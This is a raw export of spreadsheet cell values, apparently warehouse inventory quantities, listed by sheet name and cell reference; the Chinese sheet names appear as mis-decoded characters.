' ÐÂ¿â´æQ345CDE,F134,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,G134,[],""
' ÐÂ¿â´æQ345CDE,E135,[],""
' ÐÂ¿â´æQ345CDE,F135,"",10.00000000000000000000
' ÐÂ¿â´æQ345CDE,G135,[],""
' ÐÂ¿â´æQ345CDE,E136,[],""
' ÐÂ¿â´æQ345CDE,F136,"",5.00000000000000000000
' ÐÂ¿â´æQ345CDE,G136,[],""
' ÐÂ¿â´æQ345CDE,E137,[],""
' ÐÂ¿â´æQ345CDE,F137,"",4.00000000000000000000
' ÐÂ¿â´æQ345CDE,G137,[],""
' ÐÂ¿â´æQ345CDE,E138,[],""
' ÐÂ¿â´æQ345CDE,F138,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,G138,[],""
' ÐÂ¿â´æQ345CDE,E139,[],""
' ÐÂ¿â´æQ345CDE,F139,"",13.00000000000000000000
' ÐÂ¿â´æQ345CDE,G139,[],""
' ÐÂ¿â´æQ345CDE,E140,[],""
' ÐÂ¿â´æQ345CDE,F140,"",15.00000000000000000000
' ÐÂ¿â´æQ345CDE,G140,[],""
' ÐÂ¿â´æQ345CDE,E141,[],""
' ÐÂ¿â´æQ345CDE,F141,"",5.00000000000000000000
' ÐÂ¿â´æQ345CDE,G141,[],""
' ÐÂ¿â´æQ345CDE,E142,[],""
' ÐÂ¿â´æQ345CDE,F142,"",4.00000000000000000000
' ÐÂ¿â´æQ345CDE,G142,[],""
' ÐÂ¿â´æQ345CDE,E143,[],""
' ÐÂ¿â´æQ345CDE,F143,"",2.00000000000000000000
' ÐÂ¿â´æQ345CDE,G143,[],""
' ÐÂ¿â´æQ345CDE,E144,[],""
' ÐÂ¿â´æQ345CDE,F144,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,G144,[],""
' ÐÂ¿â´æQ345CDE,E145,[],""
' ÐÂ¿â´æQ345CDE,F145,"",5.00000000000000000000
' ÐÂ¿â´æQ345CDE,G145,[],""
' ÐÂ¿â´æQ345CDE,E146,[],""
' ÐÂ¿â´æQ345CDE,F146,"",6.00000000000000000000
' ÐÂ¿â´æQ345CDE,G146,[],""
' ÐÂ¿â´æQ345CDE,E147,[],""
' ÐÂ¿â´æQ345CDE,F147,"",2.00000000000000000000
' ÐÂ¿â´æQ345CDE,G147,[],""
' ÐÂ¿â´æQ345CDE,E148,[],""
' ÐÂ¿â´æQ345CDE,F148,"",7.00000000000000000000
' ÐÂ¿â´æQ345CDE,G148,[],""
' ÐÂ¿â´æQ345CDE,E149,[],""
' ÐÂ¿â´æQ345CDE,F149,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,G149,[],""
' ÐÂ¿â´æQ345CDE,E150,[],""
' ÐÂ¿â´æQ345CDE,F150,"",4.00000000000000000000
' ÐÂ¿â´æQ345CDE,G150,[],""
' ÐÂ¿â´æQ345CDE,E151,[],""
' ÐÂ¿â´æQ345CDE,F151,"",8.00000000000000000000
' ÐÂ¿â´æQ345CDE,G151,[],""
' ÐÂ¿â´æQ345CDE,G152,R49266C1543,""
' ½­Òõ¿â´æ,E2,"",3.65700000000000002842
' ½­Òõ¿â´æ,E3,"",6.72799999999999975842
' ½­Òõ¿â´æ,E4,"",5.13900000000000023448
' ½­Òõ¿â´æ,E5,"",2.91599999999999992539
' ½­Òõ¿â´æ,E6,"",4.47700000000000031264
' ½­Òõ¿â´æ,E7,"",7.22400000000000019895
' ½­Òõ¿â´æ,E8,"",10.06799999999999961631
' ½­Òõ¿â´æ,E9,"",1.93599999999999994316
' ½­Òõ¿â´æ,E10,"",3.62699999999999977973
' ½­Òõ¿â´æ,E11,"",4.85400000000000009237
' ½­Òõ¿â´æ,E12,"",1.26400000000000001243
' ½­Òõ¿â´æ,E13,"",10.51699999999999945999
' ½­Òõ¿â´æ,E14,"",1.28200000000000002842
' ½­Òõ¿â´æ,E15,"",3.60300000000000020250
' ½­Òõ¿â´æ,E16,"",7.07599999999999962341
' ½­Òõ¿â´æ,E17,"",3.51100000000000012079
' ½­Òõ¿â´æ,E19,"",1.69599999999999995204
' ½­Òõ¿â´æ,E20,"",1.69599999999999995204
' ½­Òõ¿â´æ,E22,"",5.89299999999999979394
' ½­Òõ¿â´æ,E23,"",6.01400000000000023448
' ½­Òõ¿â´æ,E24,"",1.26400000000000001243
' ½­Òõ¿â´æ,E25,"",1.26400000000000001243
' ½­Òõ¿â´æ,E26,"",12.70299999999999940314
' ½­Òõ¿â´æ,E27,"",5.98399999999999998579
' ½­Òõ¿â´æ,E28,"",5.89299999999999979394
' ½­Òõ¿â´æ,E29,"",7.14400000000000012790
' ½­Òõ¿â´æ,E30,"",7.14400000000000012790
' ½­Òõ¿â´æ,E31,"",1.69599999999999995204
' ½­Òõ¿â´æ,E32,"",2.28900000000000014566
' ½­Òõ¿â´æ,E33,"",6.50199999999999977973
' ½­Òõ¿â´æ,E34,"",5.35599999999999987210
' ½­Òõ¿â´æ,E35,"",1.26400000000000001243
' ½­Òõ¿â´æ,E36,"",9.15399999999999991473
' ½­Òõ¿â´æ,E37,"",5.11399999999999987921
' ½­Òõ¿â´æ,E39,"",3.44799999999999995381
' ½­Òõ¿â´æ,E40,"",6.50199999999999977973
' ½­Òõ¿â´æ,E41,"",6.50199999999999977973
' ½­Òõ¿â´æ,E42,"",3.45400000000000018119
' ½­Òõ¿â´æ,E43,"",3.57399999999999984368
' ½­Òõ¿â´æ,E44,"",3.65300000000000002487
' ½­Òõ¿â´æ,E45,"",8.83699999999999974420
' ½­Òõ¿â´æ,E46,"",2.33199999999999985079
' ½­Òõ¿â´æ,E47,"",4.80799999999999982947
' ½­Òõ¿â´æ,E48,"",3.33099999999999996092
' ½­Òõ¿â´æ,E49,"",1.32800000000000006928
' ½­Òõ¿â´æ,E50,"",5.86800000000000032685
' ½­Òõ¿â´æ,E52,"",11.14600000000000079581
' ½­Òõ¿â´æ,E53,"",10.93699999999999938893
' ½­Òõ¿â´æ,E54,"",10.53700000000000081002
' ½­Òõ¿â´æ,E55,"",6.57200000000000006395
' ½­Òõ¿â´æ,E56,"",6.48099999999999987210
' ½­Òõ¿â´æ,E57,"",1.26400000000000001243
' ½­Òõ¿â´æ,E58,"",2.91599999999999992539
' ½­Òõ¿â´æ,E59,"",1.69599999999999995204
' ½­Òõ¿â´æ,E60,"",4.92799999999999993605
' ½­Òõ¿â´æ,E61,"",5.08800000000000007816
' ½­Òõ¿â´æ,E62,"",5.13900000000000023448
' ½­Òõ¿â´æ,E64,"",1.81899999999999995026
' ½­Òõ¿â´æ,E65,"",1.88199999999999989519
' ½­Òõ¿â´æ,E67,"",0.99599999999999999645
' ½­Òõ¿â´æ,E68,"",3.73300000000000009592
' ½­Òõ¿â´æ,E69,"",1.69599999999999995204
' ½­Òõ¿â´æ,E71,"",5.03599999999999958789
' ½­Òõ¿â´æ,E72,"",3.10899999999999998579
' ½­Òõ¿â´æ,E73,"",5.78899999999999970157
' ½­Òõ¿â´æ,E74,"",6.40599999999999969447
' ½­Òõ¿â´æ,E75,"",6.79100000000000036948
' ½­Òõ¿â´æ,E76,"",1.48100000000000009415
' ½­Òõ¿â´æ,E77,"",1.69599999999999995204
' ½­Òõ¿â´æ,E78,"",1.30400000000000004796
' ½­Òõ¿â´æ,E79,"",1.26400000000000001243
' ½­Òõ¿â´æ,E80,"",5.11399999999999987921
' ½­Òõ¿â´æ,E81,"",14.21199999999999974420
' ½­Òõ¿â´æ,E82,"",8.90199999999999924682
' ½­Òõ¿â´æ,E83,"",14.47899999999999920419
' ½­Òõ¿â´æ,E85,"",4.20800000000000018474
' ½­Òõ¿â´æ,E86,"",9.14300000000000068212
' ½­Òõ¿â´æ,E87,"",5.13900000000000023448
' ½­Òõ¿â´æ,E88,"",6.50199999999999977973
' ½­Òõ¿â´æ,E89,"",7.46199999999999974420
' ½­Òõ¿â´æ,E90,"",8.20299999999999940314
' ½­Òõ¿â´æ,E91,"",5.11399999999999987921
' ½­Òõ¿â´æ,E92,"",3.08599999999999985434
' ½­Òõ¿â´æ,E93,"",6.07699999999999995737
' ½­Òõ¿â´æ,E94,"",5.11399999999999987921
' ½­Òõ¿â´æ,E95,"",7.14400000000000012790
' ½­Òõ¿â´æ,E96,"",7.10799999999999965183
' ½­Òõ¿â´æ,E97,"",7.10799999999999965183
' ½­Òõ¿â´æ,E98,"",7.07200000000000006395
' ½­Òõ¿â´æ,E99,"",4.06899999999999995026
' ½­Òõ¿â´æ,E100,"",12.91900000000000048317
' ½­Òõ¿â´æ,E102,"",4.08699999999999974420
' ½­Òõ¿â´æ,E103,"",4.21699999999999963762
' ½­Òõ¿â´æ,E104,"",1.69599999999999995204
' ½­Òõ¿â´æ,E105,"",5.20699999999999985079
' ½­Òõ¿â´æ,E106,"",8.03599999999999958789
' ½­Òõ¿â´æ,E107,"",3.03299999999999991829
' ½­Òõ¿â´æ,E108,"",11.07799999999999940314
' ½­Òõ¿â´æ,E109,"",6.48099999999999987210
' ½­Òõ¿â´æ,E110,"",7.51100000000000012079
' ½­Òõ¿â´æ,E112,"",7.10799999999999965183
' ½­Òõ¿â´æ,E113,"",3.26600000000000001421
' ½­Òõ¿â´æ,E114,"",6.67300000000000004263
' ½­Òõ¿â´æ,E115,"",3.90099999999999980105
' ½­Òõ¿â´æ,E116,"",5.03599999999999958789
' ½­Òõ¿â´æ,E117,"",6.12300000000000022027
' ½­Òõ¿â´æ,E119,"",5.43299999999999982947
' ½­Òõ¿â´æ,E120,"",12.43399999999999927525
' ½­Òõ¿â´æ,E121,"",6.71400000000000041211
' ½­Òõ¿â´æ,E122,"",6.08300000000000018474
' ½­Òõ¿â´æ,E123,"",4.69700000000000006395
' ½­Òõ¿â´æ,E124,"",7.20899999999999963052
' ½­Òõ¿â´æ,E125,"",3.90300000000000002487
' ½­Òõ¿â´æ,E127,"",4.94599999999999972999
' ½­Òõ¿â´æ,E128,"",7.83900000000000041211
' ½­Òõ¿â´æ,E129,"",2.67799999999999993605
' ½­Òõ¿â´æ,E130,"",2.28900000000000014566
' ½­Òõ¿â´æ,E131,"",4.81099999999999994316
' ½­Òõ¿â´æ,E132,"",5.47200000000000041922
' ½­Òõ¿â´æ,E133,"",9.15399999999999991473
' ½­Òõ¿â´æ,E134,"",5.46100000000000029843
' ½­Òõ¿â´æ,E135,"",9.14300000000000068212
' ½­Òõ¿â´æ,E136,"",8.24300000000000032685
' ½­Òõ¿â´æ,E137,"",6.01400000000000023448
' ½­Òõ¿â´æ,E138,"",6.01400000000000023448
' ½­Òõ¿â´æ,E139,"",6.84799999999999986500
' ½­Òõ¿â´æ,E140,"",2.96300000000000007816
' ½­Òõ¿â´æ,E141,"",5.03599999999999958789
' ½­Òõ¿â´æ,E143,"",2.59100000000000019185
' ½­Òõ¿â´æ,E144,"",4.41099999999999958789
' ½­Òõ¿â´æ,E148,"",9.24799999999999933209
' ½­Òõ¿â´æ,E151,"",7.11800000000000032685
' ½­Òõ¿â´æ,E153,"",5.03599999999999958789
' ½­Òõ¿â´æ,E154,"",3.51299999999999990052
' ½­Òõ¿â´æ,E156,"",2.46700000000000008171
' ½­Òõ¿â´æ,E158,"",1.41100000000000003197
' ½­Òõ¿â´æ,E159,"",3.10899999999999998579
' ½­Òõ¿â´æ,E160,"",2.10300000000000020250
' ½­Òõ¿â´æ,E161,"",4.91899999999999959499
' ½­Òõ¿â´æ,E163,"",3.46200000000000018829
' ½­Òõ¿â´æ,E164,"",2.61600000000000010303
' ½­Òõ¿â´æ,E166,"",7.82699999999999995737
' ½­Òõ¿â´æ,E167,"",9.89100000000000001421
' ½­Òõ¿â´æ,E168,"",6.50199999999999977973
' ½­Òõ¿â´æ,E169,"",1.72700000000000009059
' ½­Òõ¿â´æ,E170,"",9.45800000000000018474
' ½­Òõ¿â´æ,E171,"",9.45800000000000018474
' ½­Òõ¿â´æ,E172,"",7.44700000000000006395
' ½­Òõ¿â´æ,E174,"",6.37600000000000033396
' ½­Òõ¿â´æ,E175,"",6.23099999999999987210
' ½­Òõ¿â´æ,E176,"",3.63700000000000001066
' ½­Òõ¿â´æ,E178,"",6.32699999999999995737
' ½­Òõ¿â´æ,E179,"",5.23099999999999987210
' ½­Òõ¿â´æ,E181,"",11.65300000000000046896
' ½­Òõ¿â´æ,E182,"",12.97300000000000075318
' ½­Òõ¿â´æ,E183,"",13.43299999999999982947
' ½­Òõ¿â´æ,E185,"",3.84699999999999997513
' ½­Òõ¿â´æ,E186,"",1.36800000000000010481
' ½­Òõ¿â´æ,E187,"",3.07699999999999995737
' ½­Òõ¿â´æ,E188,"",4.21699999999999963762
' ½­Òõ¿â´æ,E189,"",1.64900000000000002132
' ½­Òõ¿â´æ,E190,"",12.71700000000000052580
' ½­Òõ¿â´æ,E192,"",2.54199999999999981526
' ½­Òõ¿â´æ,E193,"",8.59399999999999941735
' ½­Òõ¿â´æ,E194,"",4.14700000000000024158
' ½­Òõ¿â´æ,E195,"",4.81700000000000017053
' ½­Òõ¿â´æ,E197,"",2.37199999999999988631
' ½­Òõ¿â´æ,E198,"",12.55799999999999982947
' ½­Òõ¿â´æ,E200,"",5.11399999999999987921
' ½­Òõ¿â´æ,E202,"",3.09299999999999997158
' ½­Òõ¿â´æ,E203,"",11.13100000000000022737
' ½­Òõ¿â´æ,E204,"",4.90899999999999980815
' ½­Òõ¿â´æ,E205,"",12.97300000000000075318
' ½­Òõ¿â´æ,E206,"",7.14400000000000012790
' ½­Òõ¿â´æ,E207,"",7.10799999999999965183
' ½­Òõ¿â´æ,E208,"",12.15199999999999924682
' ½­Òõ¿â´æ,E209,"",8.12100000000000044054
' ½­Òõ¿â´æ,E211,"",7.10799999999999965183
' ½­Òõ¿â´æ,E212,"",1.23700000000000009948
' ½­Òõ¿â´æ,E213,"",5.11399999999999987921
' ½­Òõ¿â´æ,E214,"",7.73200000000000020606
' ½­Òõ¿â´æ,E215,"",8.90199999999999924682
' ½­Òõ¿â´æ,E216,"",5.98399999999999998579
' ½­Òõ¿â´æ,E217,"",8.14799999999999968736
' ½­Òõ¿â´æ,E218,"",5.98399999999999998579
' ½­Òõ¿â´æ,E219,"",2.94200000000000017053
' ½­Òõ¿â´æ,E220,"",7.83900000000000041211
' ½­Òõ¿â´æ,E221,"",3.46200000000000018829
' ½­Òõ¿â´æ,E222,"",12.37800000000000011369
' ½­Òõ¿â´æ,E223,"",1.20100000000000006750
' ½­Òõ¿â´æ,E224,"",1.41100000000000003197
' ½­Òõ¿â´æ,E225,"",5.69899999999999984368
' ½­Òõ¿â´æ,E226,"",11.23300000000000054001
' ½­Òõ¿â´æ,E227,"",6.48099999999999987210
' ½­Òõ¿â´æ,E228,"",8.20299999999999940314
' ½­Òõ¿â´æ,E231,"",8.57199999999999917577
' ½­Òõ¿â´æ,E232,"",7.00300000000000011369
' ½­Òõ¿â´æ,E233,"",5.13900000000000023448
' ½­Òõ¿â´æ,E234,"",3.65600000000000013856
' ½­Òõ¿â´æ,E236,"",4.99099999999999965894
' ½­Òõ¿â´æ,E237,"",2.53900000000000014566
' ½­Òõ¿â´æ,E238,"",4.29800000000000004263
' ½­Òõ¿â´æ,E239,"",6.70399999999999973710
' ½­Òõ¿â´æ,E240,"",4.29800000000000004263
' ½­Òõ¿â´æ,E241,"",2.88899999999999979039
' ½­Òõ¿â´æ,E242,"",8.20299999999999940314
' ½­Òõ¿â´æ,E243,"",6.51100000000000012079
' ½­Òõ¿â´æ,E245,"",7.10799999999999965183
' ½­Òõ¿â´æ,E246,"",7.10799999999999965183
' ½­Òõ¿â´æ,E247,"",8.20299999999999940314
' ½­Òõ¿â´æ,E248,"",6.50199999999999977973
' ½­Òõ¿â´æ,E249,"",6.50199999999999977973
' ½­Òõ¿â´æ,E250,"",5.13900000000000023448
' ½­Òõ¿â´æ,E251,"",3.33099999999999996092
' ½­Òõ¿â´æ,E253,"",1.48100000000000009415
' ½­Òõ¿â´æ,E254,"",3.85700000000000020606
' ½­Òõ¿â´æ,E255,"",8.83699999999999974420
' ½­Òõ¿â´æ,E256,"",6.50199999999999977973
' ½­Òõ¿â´æ,E257,"",12.71700000000000052580
' ½­Òõ¿â´æ,E258,"",12.15199999999999924682
' ½­Òõ¿â´æ,E259,"",12.15199999999999924682
' ½­Òõ¿â´æ,E260,"",4.80799999999999982947
' ½­Òõ¿â´æ,E261,"",4.24699999999999988631
' ½­Òõ¿â´æ,E263,"",3.73700000000000009948
' ½­Òõ¿â´æ,E264,"",6.66600000000000036948
' ½­Òõ¿â´æ,E265,"",7.74399999999999977263
' ½­Òõ¿â´æ,E266,"",5.11399999999999987921
' ½­Òõ¿â´æ,E267,"",1.92700000000000004619
' ½­Òõ¿â´æ,E268,"",5.11399999999999987921
' ½­Òõ¿â´æ,E269,"",5.08800000000000007816
' ½­Òõ¿â´æ,E270,"",5.11399999999999987921
' ½­Òõ¿â´æ,E271,"",14.68399999999999927525
' ½­Òõ¿â´æ,E272,"",11.73600000000000065370
' ½­Òõ¿â´æ,E273,"",4.89100000000000001421
' ½­Òõ¿â´æ,E274,"",3.60300000000000020250
' ½­Òõ¿â´æ,E275,"",8.92800000000000082423
' ½­Òõ¿â´æ,E276,"",3.25099999999999988987
' ½­Òõ¿â´æ,E277,"",5.13900000000000023448
' ½­Òõ¿â´æ,E278,"",4.45399999999999973710
' ½­Òõ¿â´æ,E280,"",4.80799999999999982947
' ½­Òõ¿â´æ,E281,"",5.11399999999999987921
' ½­Òõ¿â´æ,E282,"",5.11399999999999987921
' ½­Òõ¿â´æ,E283,"",8.06900000000000083844
' ½­Òõ¿â´æ,E284,"",4.89100000000000001421
' ½­Òõ¿â´æ,E285,"",1.93599999999999994316
' ½­Òõ¿â´æ,E286,"",13.14700000000000024158
' ½­Òõ¿â´æ,E287,"",7.83900000000000041211
' ½­Òõ¿â´æ,E289,"",3.57200000000000006395
' ½­Òõ¿â´æ,E290,"",5.05999999999999960920
' ½­Òõ¿â´æ,E291,"",11.94899999999999984368
' ½­Òõ¿â´æ,E292,"",4.60099999999999997868
' ½­Òõ¿â´æ,E293,"",2.88899999999999979039
' ½­Òõ¿â´æ,E294,"",2.81400000000000005684
' ½­Òõ¿â´æ,E295,"",3.25099999999999988987
' ½­Òõ¿â´æ,E297,"",4.89100000000000001421
' ½­Òõ¿â´æ,E298,"",3.39599999999999990763
' ½­Òõ¿â´æ,E299,"",8.24300000000000032685
' ½­Òõ¿â´æ,E300,"",1.00800000000000000711
' ½­Òõ¿â´æ,E302,"",5.11399999999999987921
' ½­Òõ¿â´æ,E303,"",7.34799999999999986500
' ½­Òõ¿â´æ,E304,"",4.91199999999999992184
' ½­Òõ¿â´æ,E306,"",4.52200000000000024158
' ½­Òõ¿â´æ,E307,"",3.31700000000000017053
' ½­Òõ¿â´æ,E308,"",2.44799999999999995381
' ½­Òõ¿â´æ,E309,"",1.65399999999999991473
' ½­Òõ¿â´æ,E310,"",4.48099999999999987210
' ½­Òõ¿â´æ,E311,"",1.38399999999999989697
' ½­Òõ¿â´æ,E312,"",7.53599999999999958789
' ½­Òõ¿â´æ,E313,"",4.10899999999999998579
' ½­Òõ¿â´æ,E314,"",4.66800000000000014921
' ½­Òõ¿â´æ,E315,"",4.66800000000000014921
' ½­Òõ¿â´æ,E316,"",5.91899999999999959499
' ½­Òõ¿â´æ,E317,"",4.97400000000000019895
' ½­Òõ¿â´æ,E318,"",5.11399999999999987921
' ½­Òõ¿â´æ,E319,"",7.53599999999999958789
' ½­Òõ¿â´æ,E320,"",10.51699999999999945999
' ½­Òõ¿â´æ,E321,"",2.81099999999999994316
' ½­Òõ¿â´æ,E322,"",2.91900000000000003908
' ½­Òõ¿â´æ,E323,"",4.27400000000000002132
' ½­Òõ¿â´æ,E324,"",1.06099999999999994316
' ½­Òõ¿â´æ,E325,"",5.35599999999999987210
' ½­Òõ¿â´æ,E326,"",4.76700000000000034817
' ½­Òõ¿â´æ,E327,"",4.81799999999999961631
' ½­Òõ¿â´æ,E328,"",4.86800000000000032685
' ½­Òõ¿â´æ,E329,"",5.27400000000000002132
' ½­Òõ¿â´æ,E330,"",4.43400000000000016342
' ½­Òõ¿â´æ,E332,"",4.66800000000000014921
' ½­Òõ¿â´æ,B333,"",8.69999999999999928946
' ½­Òõ¿â´æ,E333,"",1.23900000000000010125
' ½­Òõ¿â´æ,E334,"",1.05699999999999993960
' ½­Òõ¿â´æ,E335,"",5.11200000000000009948
' ½­Òõ¿â´æ,E336,"",6.06599999999999983658
' ½­Òõ¿â´æ,E337,"",1.08800000000000007816
' ½­Òõ¿â´æ,E338,"",1.79600000000000004086
' ½­Òõ¿â´æ,E339,"",3.98899999999999987921
' ½­Òõ¿â´æ,E340,"",4.66800000000000014921
' ½­Òõ¿â´æ,E342,"",4.89700000000000024158
' ½­Òõ¿â´æ,E343,"",5.43200000000000038369
' ½­Òõ¿â´æ,E344,"",3.52599999999999980105
' ½­Òõ¿â´æ,E345,"",0.78300000000000002931
' ½­Òõ¿â´æ,E346,"",5.91899999999999959499
' ½­Òõ¿â´æ,E347,"",5.39700000000000024158
' ½­Òõ¿â´æ,E348,"",13.38299999999999911893
' ½­Òõ¿â´æ,E349,"",1.54099999999999992539
' ½­Òõ¿â´æ,E350,"",5.56899999999999995026
' ½­Òõ¿â´æ,B351,"",8.69999999999999928946
' ½­Òõ¿â´æ,E351,"",1.55800000000000005151
' ½­Òõ¿â´æ,E352,"",2.22599999999999997868
' ½­Òõ¿â´æ,E353,"",5.56899999999999995026
' ½­Òõ¿â´æ,E354,"",3.36799999999999988276
' ½­Òõ¿â´æ,E355,"",3.80699999999999993960
' ½­Òõ¿â´æ,E356,"",1.68199999999999993960
' ½­Òõ¿â´æ,E357,"",4.61200000000000009948
' ½­Òõ¿â´æ,E358,"",8.24300000000000032685
' ½­Òõ¿â´æ,E360,"",3.01399999999999979039
' ½­Òõ¿â´æ,E361,"",3.24800000000000022027
' ½­Òõ¿â´æ,E362,"",3.10899999999999998579
' ½­Òõ¿â´æ,E363,"",5.13900000000000023448
' ½­Òõ¿â´æ,E364,"",4.81700000000000017053
' ½­Òõ¿â´æ,E365,"",1.53899999999999992362
' ½­Òõ¿â´æ,E366,"",7.53599999999999958789
' ½­Òõ¿â´æ,E367,"",8.67099999999999937472
' ½­Òõ¿â´æ,E368,"",0.49699999999999999734
' ½­Òõ¿â´æ,E369,"",4.04199999999999981526
' ½­Òõ¿â´æ,E370,"",3.10899999999999998579
' ½­Òõ¿â´æ,E371,"",4.04199999999999981526
' ½­Òõ¿â´æ,E372,"",1.39900000000000002132
' ½­Òõ¿â´æ,E373,"",2.60599999999999987210
' ½­Òõ¿â´æ,E375,"",3.36799999999999988276
' ½­Òõ¿â´æ,E377,"",2.44799999999999995381
' ½­Òõ¿â´æ,E378,"",5.80900000000000016342
' ½­Òõ¿â´æ,E379,"",5.51199999999999956657
' ½­Òõ¿â´æ,E380,"",2.54300000000000014921
' ½­Òõ¿â´æ,E381,"",7.53599999999999958789
' ½­Òõ¿â´æ,E382,"",5.43200000000000038369
' ½­Òõ¿â´æ,E383,"",3.98399999999999998579
' ½­Òõ¿â´æ,E384,"",10.70299999999999940314
' ½­Òõ¿â´æ,B385,"",8.69999999999999928946
' ½­Òõ¿â´æ,E385,"",1.55800000000000005151
' ½­Òõ¿â´æ,E386,"",2.89699999999999979750
' ½­Òõ¿â´æ,E387,"",3.51200000000000001066
' ½­Òõ¿â´æ,E388,"",1.42300000000000004263
' ½­Òõ¿â´æ,E389,"",1.65199999999999991296
' ½­Òõ¿â´æ,E391,"",1.84299999999999997158
' ½­Òõ¿â´æ,B392,"",8.69999999999999928946
' ½­Òõ¿â´æ,E392,"",1.28099999999999991651
' ½­Òõ¿â´æ,E393,"",3.41199999999999992184
' ½­Òõ¿â´æ,E394,"",3.55100000000000015632
' ½­Òõ¿â´æ,B395,"",8.69999999999999928946
' ½­Òõ¿â´æ,E395,"",1.55800000000000005151
' ½­Òõ¿â´æ,E396,"",1.50600000000000000533
' ½­Òõ¿â´æ,E397,"",1.50600000000000000533
' ½­Òõ¿â´æ,E398,"",3.16100000000000003197
' ½­Òõ¿â´æ,E400,"",3.35199999999999986855
' ½­Òõ¿â´æ,E401,"",2.00199999999999977973
' ½­Òõ¿â´æ,E402,"",3.53900000000000014566
' ½­Òõ¿â´æ,E403,"",5.88799999999999990052
' ½­Òõ¿â´æ,E404,"",2.49299999999999988276
' ½­Òõ¿â´æ,E405,"",3.01399999999999979039
' ½­Òõ¿â´æ,E407,"",4.04199999999999981526
' ½­Òõ¿â´æ,B408,"",8.69999999999999928946
' ½­Òõ¿â´æ,E408,"",1.55200000000000004619
' ½­Òõ¿â´æ,B410,"",18.39999999999999857891
' ½­Òõ¿â´æ,E410,"",5.37300000000000022027
' ½­Òõ¿â´æ,E412,"",3.95599999999999996092
' ½­Òõ¿â´æ,E413,"",5.11899999999999977263
' ½­Òõ¿â´æ,E414,"",0.87800000000000000266
' ½­Òõ¿â´æ,E415,"",2.14900000000000002132
' ½­Òõ¿â´æ,E416,"",1.79400000000000003908
' ½­Òõ¿â´æ,E417,"",1.87700000000000000178
' ½­Òõ¿â´æ,E418,"",1.19399999999999995026
' ½­Òõ¿â´æ,E419,"",4.04199999999999981526
' ½­Òõ¿â´æ,E420,"",4.04199999999999981526
' ½­Òõ¿â´æ,E421,"",9.15399999999999991473
' ½­Òõ¿â´æ,E422,"",8.34500000000000063949
' ½­Òõ¿â´æ,E423,"",2.40099999999999980105
' ½­Òõ¿â´æ,E425,"",2.33599999999999985434
' ½­Òõ¿â´æ,E426,"",4.05900000000000016342
' ½­Òõ¿â´æ,B428,"",8.69999999999999928946
' ½­Òõ¿â´æ,E428,"",1.49199999999999999289
' ½­Òõ¿â´æ,B429,"",8.69999999999999928946
' ½­Òõ¿â´æ,E429,"",1.54800000000000004263
' ½­Òõ¿â´æ,E431,"",5.88799999999999990052
' ½­Òõ¿â´æ,E432,"",4.45699999999999985079
' ½­Òõ¿â´æ,E433,"",2.17600000000000015632
' ½­Òõ¿â´æ,E434,"",3.01399999999999979039
' ½­Òõ¿â´æ,E435,"",3.01399999999999979039
' ½­Òõ¿â´æ,E436,"",1.06099999999999994316
' ½­Òõ¿â´æ,E437,"",1.06099999999999994316
' ½­Òõ¿â´æ,E438,"",4.66800000000000014921
' ½­Òõ¿â´æ,E439,"",4.66800000000000014921
' ½­Òõ¿â´æ,E440,"",2.57600000000000006750
' ½­Òõ¿â´æ,E441,"",0.92900000000000004796
' ½­Òõ¿â´æ,E442,"",5.58399999999999963052
' ½­Òõ¿â´æ,E446,"",3.01399999999999979039
' ½­Òõ¿â´æ,E447,"",3.01399999999999979039
' ½­Òõ¿â´æ,E448,"",1.46700000000000008171
' ½­Òõ¿â´æ,E449,"",1.00800000000000000711
' ½­Òõ¿â´æ,E450,"",2.37900000000000000355
' ½­Òõ¿â´æ,E451,"",4.09199999999999963762
' ½­Òõ¿â´æ,E452,"",4.28899999999999970157
' ½­Òõ¿â´æ,E453,"",2.66800000000000014921
' ½­Òõ¿â´æ,E454,"",2.48600000000000020961
' ½­Òõ¿â´æ,E455,"",8.79199999999999981526
' ½­Òõ¿â´æ,B456,"",8.69999999999999928946
' ½­Òõ¿â´æ,E456,"",0.66600000000000003642
' ½­Òõ¿â´æ,B457,"",8.69999999999999928946
' ½­Òõ¿â´æ,E458,"",1.68799999999999994493
' ½­Òõ¿â´æ,E459,"",3.01399999999999979039
' ½­Òõ¿â´æ,E460,"",4.16099999999999958789
' ½­Òõ¿â´æ,E461,"",3.01399999999999979039
' ½­Òõ¿â´æ,E462,"",3.01399999999999979039
' ½­Òõ¿â´æ,E464,"",0.75900000000000000799
' ½­Òõ¿â´æ,E466,"",2.42099999999999981881
' ½­Òõ¿â´æ,E467,"",1.02899999999999991473
' ½­Òõ¿â´æ,E469,"",0.77100000000000001865
' ½­Òõ¿â´æ,E470,"",1.78099999999999991651
' ½­Òõ¿â´æ,E473,"",3.50700000000000011724
' ½­Òõ¿â´æ,E474,"",2.66199999999999992184
' ½­Òõ¿â´æ,E475,"",5.56899999999999995026
' ½­Òõ¿â´æ,E476,"",7.53599999999999958789
' ½­Òõ¿â´æ,B477,"",8.69999999999999928946
' ½­Òõ¿â´æ,E477,"",1.51699999999999990408
' ½­Òõ¿â´æ,B478,"",18.39999999999999857891
' ½­Òõ¿â´æ,E478,"",4.97499999999999964473
' ½­Òõ¿â´æ,E479,"",3.01399999999999979039
' ½­Òõ¿â´æ,E480,"",4.66800000000000014921
' ½­Òõ¿â´æ,E481,"",5.44299999999999961631
' ½­Òõ¿â´æ,E482,"",2.05399999999999982592
' ½­Òõ¿â´æ,E483,"",2.05399999999999982592
' ½­Òõ¿â´æ,E484,"",4.04199999999999981526
' ½­Òõ¿â´æ,E485,"",5.88799999999999990052
' ½­Òõ¿â´æ,E486,"",4.65700000000000002842
' ½­Òõ¿â´æ,E487,"",2.69300000000000006040
' ½­Òõ¿â´æ,E488,"",2.74100000000000010303
' ½­Òõ¿â´æ,E489,"",1.16700000000000003730
' ½­Òõ¿â´æ,E490,"",2.65799999999999991829
' ½­Òõ¿â´æ,E491,"",6.59900000000000019895
' ½­Òõ¿â´æ,E492,"",5.27400000000000002132
' ½­Òõ¿â´æ,E493,"",2.98099999999999987210
' ½­Òõ¿â´æ,E495,"",4.69700000000000006395
' ½­Òõ¿â´æ,E496,"",1.11899999999999999467
' ½­Òõ¿â´æ,E497,"",5.31299999999999972289
' ½­Òõ¿â´æ,B499,"",8.69999999999999928946
' ½­Òõ¿â´æ,E499,"",1.55800000000000005151
' ½­Òõ¿â´æ,E500,"",5.13600000000000012079
' ½­Òõ¿â´æ,E501,"",3.83099999999999996092
' ½­Òõ¿â´æ,E502,"",2.42099999999999981881
